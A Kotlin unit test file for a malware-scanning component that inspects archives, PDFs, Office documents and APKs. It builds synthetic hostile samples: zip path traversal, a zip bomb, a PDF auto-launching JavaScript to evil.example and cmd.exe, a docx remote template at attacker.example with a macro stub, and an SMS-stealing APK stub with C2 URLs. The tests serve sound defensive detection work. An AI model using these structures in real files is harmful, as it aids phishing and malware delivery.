package id.chatguard.analyzer

import id.chatguard.core.model.FileType
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertTrue
import org.junit.Rule
import org.junit.Test
import org.junit.rules.TemporaryFolder
import java.io.ByteArrayOutputStream
import java.io.File
import java.nio.ByteBuffer
import java.nio.ByteOrder
import java.security.MessageDigest
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

class FileAnalyzersTest {

    @get:Rule
    val tempFolder = TemporaryFolder()

    @Test
    fun `ArchiveAnalyzer detects path traversal, apk, executable, double extension without extracting`() {
        val workDir = tempFolder.newFolder("archive_work")
        val zipFile = File(workDir, "bundle.zip")
        ZipOutputStream(zipFile.outputStream()).use { zos ->
            zos.putNextEntry(ZipEntry("../../evil.txt"))
            zos.write("traversal".toByteArray())
            zos.closeEntry()

            zos.putNextEntry(ZipEntry("/absolute/path.txt"))
            zos.write("abs".toByteArray())
            zos.closeEntry()

            zos.putNextEntry(ZipEntry("payload.apk"))
            zos.write("PK".toByteArray())
            zos.closeEntry()

            zos.putNextEntry(ZipEntry("invoice.pdf.exe"))
            zos.write("MZ".toByteArray())
            zos.closeEntry()
        }

        val result = ArchiveAnalyzer().inspect(zipFile)

        assertFalse(result.parseFailed)
        assertEquals(FileType.ARCHIVE, result.fileType)
        assertEquals("bundle.zip", result.fileName)
        assertEquals(sha256Hex(zipFile), result.sha256)

        val codes = result.signals.map { it.code }.toSet()
        assertTrue("Expected ARCHIVE_PATH_TRAVERSAL in $codes", "ARCHIVE_PATH_TRAVERSAL" in codes)
        assertTrue("Expected ARCHIVE_CONTAINS_APK in $codes", "ARCHIVE_CONTAINS_APK" in codes)
        assertTrue("Expected ARCHIVE_CONTAINS_EXECUTABLE in $codes", "ARCHIVE_CONTAINS_EXECUTABLE" in codes)
        assertTrue("Expected ARCHIVE_DOUBLE_EXTENSION in $codes", "ARCHIVE_DOUBLE_EXTENSION" in codes)

        // Ensure nothing was extracted into workDir
        assertEquals(listOf("bundle.zip"), workDir.list()?.toList())
    }

    @Test
    fun `ArchiveAnalyzer detects zip bomb by entry count without extracting`() {
        val zipFile = tempFolder.newFile("bomb_count.zip")
        ZipOutputStream(zipFile.outputStream()).use { zos ->
            for (i in 0 until 10_005) {
                zos.putNextEntry(ZipEntry("f$i.txt"))
                zos.closeEntry()
            }
        }

        val result = ArchiveAnalyzer().inspect(zipFile)

        assertFalse(result.parseFailed)
        assertEquals(FileType.ARCHIVE, result.fileType)
        val codes = result.signals.map { it.code }.toSet()
        assertTrue("Expected ARCHIVE_ZIP_BOMB in $codes", "ARCHIVE_ZIP_BOMB" in codes)
    }

    @Test
    fun `ArchiveAnalyzer handles RAR5 safely with ARCHIVE_UNSUPPORTED_INSPECTION`() {
        val rarFile = tempFolder.newFile("encrypted.rar")
        // RAR5 signature: 52 61 72 21 1A 07 01 00
        rarFile.writeBytes(byteArrayOf(0x52, 0x61, 0x72, 0x21, 0x1A, 0x07, 0x01, 0x00, 0x00, 0x01))

        val result = ArchiveAnalyzer().inspect(rarFile)

        assertFalse(result.parseFailed)
        assertEquals(FileType.ARCHIVE, result.fileType)
        val codes = result.signals.map { it.code }.toSet()
        assertTrue("Expected ARCHIVE_UNSUPPORTED_INSPECTION in $codes", "ARCHIVE_UNSUPPORTED_INSPECTION" in codes)
    }

    @Test
    fun `PdfAnalyzer extracts URI and detects JavaScript and OpenAction`() {
        val pdfFile = tempFolder.newFile("malicious.pdf")
        val pdfContent = """
            %PDF-1.7
            1 0 obj
            << /Type /Catalog /OpenAction 2 0 R >>
            endobj
            2 0 obj
            << /S /JavaScript /JS (app.launchURL('https://evil.example/login');) >>
            endobj
            3 0 obj
            << /S /URI /URI (https://phish.example.id/claim) >>
            endobj
            4 0 obj
            << /S /Launch /F (cmd.exe) >>
            endobj
            %%EOF
        """.trimIndent()
        pdfFile.writeText(pdfContent)

        val result = PdfAnalyzer().inspect(pdfFile)

        assertFalse(result.parseFailed)
        assertEquals(FileType.PDF, result.fileType)
        assertTrue(result.extractedUrls.contains("https://phish.example.id/claim"))
        assertTrue(result.extractedUrls.contains("https://evil.example/login"))

        val codes = result.signals.map { it.code }.toSet()
        assertTrue("Expected PDF_JAVASCRIPT in $codes", "PDF_JAVASCRIPT" in codes)
        assertTrue("Expected PDF_OPEN_ACTION in $codes", "PDF_OPEN_ACTION" in codes)
        assertTrue("Expected PDF_LAUNCH_ACTION in $codes", "PDF_LAUNCH_ACTION" in codes)
    }

    @Test
    fun `PdfAnalyzer returns parseFailed on corrupted non-PDF bytes without throwing`() {
        val badPdf = tempFolder.newFile("corrupt.pdf")
        badPdf.writeBytes(byteArrayOf(0x00, 0x01, 0x02, 0x03, 0xFF.toByte()))

        val result = PdfAnalyzer().inspect(badPdf)

        assertTrue(result.parseFailed)
        assertEquals(FileType.PDF, result.fileType)
        assertTrue(result.signals.any { it.code == "PARSE_FAILED" })
    }

    @Test
    fun `OfficeAnalyzer detects external relationship URL and vbaProject macro in docx`() {
        val docxFile = tempFolder.newFile("invoice.docx")
        ZipOutputStream(docxFile.outputStream()).use { zos ->
            zos.putNextEntry(ZipEntry("[Content_Types].xml"))
            zos.write("<Types/>".toByteArray())
            zos.closeEntry()

            zos.putNextEntry(ZipEntry("word/_rels/document.xml.rels"))
            zos.write(
                """
                <?xml version="1.0" encoding="UTF-8"?>
                <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
                  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://attacker.example/template.dotm" TargetMode="External"/>
                </Relationships>
                """.trimIndent().toByteArray()
            )
            zos.closeEntry()

            zos.putNextEntry(ZipEntry("word/vbaProject.bin"))
            zos.write(byteArrayOf(0x01, 0x02, 0x03, 0x04))
            zos.closeEntry()
        }

        val result = OfficeAnalyzer().inspect(docxFile)

        assertFalse(result.parseFailed)
        assertEquals(FileType.OFFICE, result.fileType)
        assertTrue(result.extractedUrls.contains("https://attacker.example/template.dotm"))

        val codes = result.signals.map { it.code }.toSet()
        assertTrue("Expected OFFICE_MACRO in $codes", "OFFICE_MACRO" in codes)
        assertTrue("Expected OFFICE_EXTERNAL_REL in $codes", "OFFICE_EXTERNAL_REL" in codes)
    }

    @Test
    fun `OfficeAnalyzer returns parseFailed on invalid zip`() {
        val badDocx = tempFolder.newFile("broken.docx")
        badDocx.writeText("not a zip at all")

        val result = OfficeAnalyzer().inspect(badDocx)

        assertTrue(result.parseFailed)
        assertEquals(FileType.OFFICE, result.fileType)
        assertTrue(result.signals.any { it.code == "PARSE_FAILED" })
    }

    @Test
    fun `ApkAnalyzer returns parseFailed on truncated bytes`() {
        val badApk = tempFolder.newFile("truncated.apk")
        badApk.writeBytes(byteArrayOf(0x50, 0x4B, 0x03, 0x04, 0x14, 0x00))

        val result = ApkAnalyzer().inspect(badApk)

        assertTrue(result.parseFailed)
        assertEquals(FileType.APK, result.fileType)
        assertTrue(result.signals.any { it.code == "PARSE_FAILED" })
    }

    @Test
    fun `ApkAnalyzer extracts packageName, permissions, certSha256, and URLs from synthetic APK`() {
        val apkFile = tempFolder.newFile("sample.apk")
        val axml = buildSyntheticAxml(
            packageName = "com.evil.undangan",
            permissions = listOf(
                "android.permission.READ_SMS",
                "android.permission.RECEIVE_SMS"
            )
        )
        val fakeDex = ("dex\n035\u0000" +
            "https://c2.evil.example/api " +
            "http://185.220.101.1/gate").toByteArray(Charsets.UTF_8)
        val fakeCertBytes = "FAKE-DER-CERT-BYTES-FOR-TEST".toByteArray(Charsets.UTF_8)

        ZipOutputStream(apkFile.outputStream()).use { zos ->
            zos.putNextEntry(ZipEntry("AndroidManifest.xml"))
            zos.write(axml)
            zos.closeEntry()

            zos.putNextEntry(ZipEntry("classes.dex"))
            zos.write(fakeDex)
            zos.closeEntry()

            zos.putNextEntry(ZipEntry("META-INF/CERT.RSA"))
            zos.write(fakeCertBytes)
            zos.closeEntry()
        }

        val result = ApkAnalyzer().inspect(apkFile)

        assertFalse(result.parseFailed)
        assertEquals(FileType.APK, result.fileType)
        assertEquals("com.evil.undangan", result.packageName)
        assertTrue(result.permissions.contains("android.permission.READ_SMS"))
        assertTrue(result.permissions.contains("android.permission.RECEIVE_SMS"))
        assertNotNull(result.certSha256)
        assertEquals(64, result.certSha256!!.length)
        assertTrue(result.extractedUrls.contains("https://c2.evil.example/api"))
        assertTrue(result.extractedUrls.contains("http://185.220.101.1/gate"))
        assertTrue(result.signals.any { it.code == "APK_RAW_IP_URL" })
    }

    @Test
    fun `FileAnalyzerDispatcher routes by file type and computes sha256`() {
        val pdfFile = tempFolder.newFile("doc.pdf")
        pdfFile.writeText("%PDF-1.4\n%%EOF\n")

        val result = FileAnalyzerDispatcher.inspect(pdfFile)

        assertEquals(FileType.PDF, result.fileType)
        assertEquals(sha256Hex(pdfFile), result.sha256)
        assertFalse(result.parseFailed)
    }

    @Test
    fun `ApkAnalyzer extracts certSha256 from v2 signing block with cert low byte ge 0xFC`() {
        val certBytes = buildMinimalX509CertWithBodyLen(0x01FC) // 508 + 4 = 512 bytes, low byte = 0xFC
        assertEquals(0xFC.toByte(), certBytes[3])

        val rawZip = ByteArrayOutputStream()
        ZipOutputStream(rawZip).use { zos ->
            zos.putNextEntry(ZipEntry("AndroidManifest.xml"))
            zos.write(buildSyntheticAxml("com.test.v2sig", emptyList()))
            zos.closeEntry()
        }
        val zipWithV2 = injectApkSigBlock(rawZip.toByteArray(), certBytes)
        val apkFile = tempFolder.newFile("v2sig.apk")
        apkFile.writeBytes(zipWithV2)

        val result = ApkAnalyzer().inspect(apkFile)

        assertFalse(result.parseFailed)
        assertEquals("com.test.v2sig", result.packageName)
        val expectedCertSha = MessageDigest.getInstance("SHA-256")
            .digest(certBytes)
            .joinToString("") { "%02x".format(it) }
        assertEquals(expectedCertSha, result.certSha256)
    }

    @Test
    fun `analyzers return parseFailed without throwing on missing or directory files`() {
        val missing = File(tempFolder.root, "does_not_exist.apk")
        val dir = tempFolder.newFolder("not_a_file")

        for (analyzer in listOf(ApkAnalyzer(), PdfAnalyzer(), OfficeAnalyzer(), ArchiveAnalyzer())) {
            val resMissing = analyzer.inspect(missing)
            assertTrue(resMissing.parseFailed)
            assertTrue(resMissing.signals.any { it.code == "PARSE_FAILED" })

            val resDir = analyzer.inspect(dir)
            assertTrue(resDir.parseFailed)
            assertTrue(resDir.signals.any { it.code == "PARSE_FAILED" })
        }
    }

    private fun sha256Hex(file: File): String {
        val digest = MessageDigest.getInstance("SHA-256")
        file.inputStream().use { input ->
            val buf = ByteArray(8192)
            while (true) {
                val read = input.read(buf)
                if (read <= 0) break
                digest.update(buf, 0, read)
            }
        }
        return digest.digest().joinToString("") { "%02x".format(it) }
    }

    /**
     * Builds a minimal valid Android Binary XML (AXML) buffer containing a <manifest package="...">
     * element and <uses-permission android:name="..."/> child elements.
     */
    private fun buildSyntheticAxml(packageName: String, permissions: List<String>): ByteArray {
        val strings = mutableListOf(
            "http://schemas.android.com/apk/res/android", // 0
            "manifest",        // 1
            "package",         // 2
            packageName,       // 3
            "uses-permission", // 4
            "name"             // 5
        )
        val permStartIdx = strings.size
        strings.addAll(permissions)

        // Build UTF-16LE string pool chunk (type 0x0001)
        val encodedStrings = strings.map { s ->
            val chars = s.toCharArray()
            val bb = ByteBuffer.allocate(2 + chars.size * 2 + 2).order(ByteOrder.LITTLE_ENDIAN)
            bb.putShort(chars.size.toShort())
            for (c in chars) bb.putShort(c.code.toShort())
            bb.putShort(0)
            bb.array()
        }
        val offsets = IntArray(strings.size)
        var curOffset = 0
        for (i in encodedStrings.indices) {
            offsets[i] = curOffset
            curOffset += encodedStrings[i].size
        }
        val padBytes = (4 - (curOffset % 4)) % 4
        val stringDataSize = curOffset + padBytes
        val headerSize = 28
        val stringsStart = headerSize + strings.size * 4
        val stringPoolSize = stringsStart + stringDataSize

        val sp = ByteBuffer.allocate(stringPoolSize).order(ByteOrder.LITTLE_ENDIAN)
        sp.putShort(0x0001.toShort()) // RES_STRING_POOL_TYPE
        sp.putShort(headerSize.toShort())
        sp.putInt(stringPoolSize)
        sp.putInt(strings.size) // stringCount
        sp.putInt(0) // styleCount
        sp.putInt(0) // flags (UTF-16)
        sp.putInt(stringsStart)
        sp.putInt(0) // stylesStart
        for (off in offsets) sp.putInt(off)
        for (b in encodedStrings) sp.put(b)
        repeat(padBytes) { sp.put(0) }

        val body = ByteArrayOutputStream()
        body.write(sp.array())

        // StartTag <manifest package="...">
        body.write(
            axmlStartTag(
                ns = -1,
                name = 1,
                attrs = listOf(AxmlAttr(ns = -1, name = 2, rawValue = 3, typedType = 0x03, typedData = 3))
            )
        )

        // <uses-permission android:name="..."/>
        for (i in permissions.indices) {
            val strIdx = permStartIdx + i
            body.write(
                axmlStartTag(
                    ns = -1,
                    name = 4,
                    attrs = listOf(AxmlAttr(ns = 0, name = 5, rawValue = strIdx, typedType = 0x03, typedData = strIdx))
                )
            )
            body.write(axmlEndTag(ns = -1, name = 4))
        }

        // EndTag </manifest>
        body.write(axmlEndTag(ns = -1, name = 1))

        val bodyBytes = body.toByteArray()
        val totalSize = 8 + bodyBytes.size
        val fileBuf = ByteBuffer.allocate(totalSize).order(ByteOrder.LITTLE_ENDIAN)
        fileBuf.putShort(0x0003.toShort()) // RES_XML_TYPE
        fileBuf.putShort(8.toShort())
        fileBuf.putInt(totalSize)
        fileBuf.put(bodyBytes)
        return fileBuf.array()
    }

    private data class AxmlAttr(
        val ns: Int,
        val name: Int,
        val rawValue: Int,
        val typedType: Int,
        val typedData: Int
    )

    private fun axmlStartTag(ns: Int, name: Int, attrs: List<AxmlAttr>): ByteArray {
        val size = 36 + attrs.size * 20
        val bb = ByteBuffer.allocate(size).order(ByteOrder.LITTLE_ENDIAN)
        bb.putShort(0x0102.toShort()) // RES_XML_START_ELEMENT_TYPE
        bb.putShort(16.toShort())
        bb.putInt(size)
        bb.putInt(1) // lineNumber
        bb.putInt(-1) // comment
        bb.putInt(ns)
        bb.putInt(name)
        bb.putShort(20.toShort()) // attributeStart
        bb.putShort(20.toShort()) // attributeSize
        bb.putShort(attrs.size.toShort()) // attributeCount
        bb.putShort(0) // idIndex
        bb.putShort(0) // classIndex
        bb.putShort(0) // styleIndex
        for (a in attrs) {
            bb.putInt(a.ns)
            bb.putInt(a.name)
            bb.putInt(a.rawValue)
            bb.putShort(8.toShort()) // Res_value size
            bb.put(0.toByte()) // res0
            bb.put(a.typedType.toByte())
            bb.putInt(a.typedData)
        }
        return bb.array()
    }

    private fun axmlEndTag(ns: Int, name: Int): ByteArray {
        val bb = ByteBuffer.allocate(24).order(ByteOrder.LITTLE_ENDIAN)
        bb.putShort(0x0103.toShort()) // RES_XML_END_ELEMENT_TYPE
        bb.putShort(16.toShort())
        bb.putInt(24)
        bb.putInt(1)
        bb.putInt(-1)
        bb.putInt(ns)
        bb.putInt(name)
        return bb.array()
    }

    private fun derTlv(tag: Int, content: ByteArray): ByteArray {
        val len = content.size
        val lenBytes = when {
            len < 128 -> byteArrayOf(len.toByte())
            len < 256 -> byteArrayOf(0x81.toByte(), len.toByte())
            else -> byteArrayOf(0x82.toByte(), (len shr 8).toByte(), (len and 0xFF).toByte())
        }
        return byteArrayOf(tag.toByte()) + lenBytes + content
    }

    private fun buildMinimalX509CertWithBodyLen(targetBodyLen: Int): ByteArray {
        // sha256WithRSAEncryption OID: 1.2.840.113549.1.1.11
        val sigAlgOid = derTlv(0x06, byteArrayOf(0x2A, 0x86.toByte(), 0x48, 0x86.toByte(), 0xF7.toByte(), 0x0D, 0x01, 0x01, 0x0B))
        val sigAlg = derTlv(0x30, sigAlgOid + derTlv(0x05, byteArrayOf()))
        // rsaEncryption OID: 1.2.840.113549.1.1.1
        val rsaOid = derTlv(0x06, byteArrayOf(0x2A, 0x86.toByte(), 0x48, 0x86.toByte(), 0xF7.toByte(), 0x0D, 0x01, 0x01, 0x01))
        val rsaAlg = derTlv(0x30, rsaOid + derTlv(0x05, byteArrayOf()))

        // Minimal Name: SEQUENCE { SET { SEQUENCE { OID(CN=2.5.4.3), UTF8String("T") } } }
        val cnOid = derTlv(0x06, byteArrayOf(0x55, 0x04, 0x03))
        val cnAttr = derTlv(0x30, cnOid + derTlv(0x0C, "T".toByteArray()))
        val name = derTlv(0x30, derTlv(0x31, cnAttr))

        val utc1 = derTlv(0x17, "240101000000Z".toByteArray(Charsets.US_ASCII))
        val utc2 = derTlv(0x17, "340101000000Z".toByteArray(Charsets.US_ASCII))
        val validity = derTlv(0x30, utc1 + utc2)

        // Minimal RSA SubjectPublicKeyInfo (65-byte positive modulus + exponent 65537)
        val mod = ByteArray(65).apply { this[0] = 0x01; this[64] = 0x01 }
        val rsaPubSeq = derTlv(0x30, derTlv(0x02, mod) + derTlv(0x02, byteArrayOf(0x01, 0x00, 0x01)))
        val spki = derTlv(0x30, rsaAlg + derTlv(0x03, byteArrayOf(0x00) + rsaPubSeq))

        val tbs = derTlv(
            0x30,
            derTlv(0x02, byteArrayOf(0x01)) + // serialNumber = 1
                sigAlg +
                name +
                validity +
                name +
                spki
        )

        val fixedLen = tbs.size + sigAlg.size
        // signatureValue BIT STRING header for length >= 256 is 4 bytes (0x03 0x82 hi lo) + 1 unused-bits byte
        val sigPayloadLen = targetBodyLen - fixedLen - 4
        require(sigPayloadLen >= 256) { "Adjust targetBodyLen; sigPayloadLen=$sigPayloadLen" }
        val sigValue = derTlv(0x03, ByteArray(sigPayloadLen))
        return derTlv(0x30, tbs + sigAlg + sigValue)
    }

    private fun injectApkSigBlock(zipBytes: ByteArray, certBytes: ByteArray): ByteArray {
        // Locate End of Central Directory (0x06054b50)
        var eocdOffset = -1
        for (i in zipBytes.size - 22 downTo 0) {
            if (zipBytes[i] == 0x50.toByte() && zipBytes[i + 1] == 0x4B.toByte() &&
                zipBytes[i + 2] == 0x05.toByte() && zipBytes[i + 3] == 0x06.toByte()
            ) {
                eocdOffset = i
                break
            }
        }
        require(eocdOffset >= 0)
        val cdOffset = ByteBuffer.wrap(zipBytes, eocdOffset + 16, 4)
            .order(ByteOrder.LITTLE_ENDIAN).int

        // Build APK Signing Block: [size8][certBytes][size8]["APK Sig Block 42"]
        val blockSize = certBytes.size.toLong() + 24L
        val sigBlock = ByteBuffer.allocate(8 + blockSize.toInt()).order(ByteOrder.LITTLE_ENDIAN)
        sigBlock.putLong(blockSize)
        sigBlock.put(certBytes)
        sigBlock.putLong(blockSize)
        sigBlock.put("APK Sig Block 42".toByteArray(Charsets.US_ASCII))
        val sigBytes = sigBlock.array()

        val modifiedTail = zipBytes.copyOfRange(cdOffset, zipBytes.size)
        val eocdInTail = eocdOffset - cdOffset
        ByteBuffer.wrap(modifiedTail, eocdInTail + 16, 4)
            .order(ByteOrder.LITTLE_ENDIAN)
            .putInt(cdOffset + sigBytes.size)

        return zipBytes.copyOfRange(0, cdOffset) + sigBytes + modifiedTail
    }
}
